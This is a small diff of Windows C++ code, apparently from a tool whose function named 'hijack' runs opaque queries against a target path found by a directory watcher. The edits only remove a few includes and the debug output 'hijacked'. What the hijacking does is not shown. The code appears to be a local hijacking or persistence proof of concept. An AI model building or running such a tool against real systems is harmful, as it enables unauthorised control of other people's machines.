@@ -9,9 +9,7 @@
 #define _CRT_SECURE_NO_WARNINGS
 using namespace std;
 
-#include <string>
 #include <ShlObj.h>
-#include <comdef.h>
 #include "iostream"
 #include <stdio.h>
 #include <windows.h>
@@ -67,7 +65,6 @@ void hijack(const wchar_t* target)
     runquery(target, blah3, 1);
     runquery(target, blah7, 1);
     runquery(target, blah5, 1);
-    printf("hijacked");
 }
 void WatchDirectory(const wchar_t* target)
 {
@@ -107,7 +104,7 @@ void WatchDirectory(const wchar_t* target)
 
                           Sleep(1000);
                          hijack(Test.c_str());
-                         wcout << "(Test.c_str()";
+      
                       
                 }
             }
